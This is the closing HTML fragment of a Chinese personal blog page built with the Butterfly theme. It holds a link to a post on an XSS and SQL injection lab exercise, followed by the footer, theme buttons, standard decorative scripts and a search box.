href="/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/" title="实验三 XSS和SQL注入">实验三 XSS和SQL注入</a><time datetime="2023-12-24T09:34:29.165Z" title="发表于 2023-12-24 17:34:29">2023-12-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Q</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
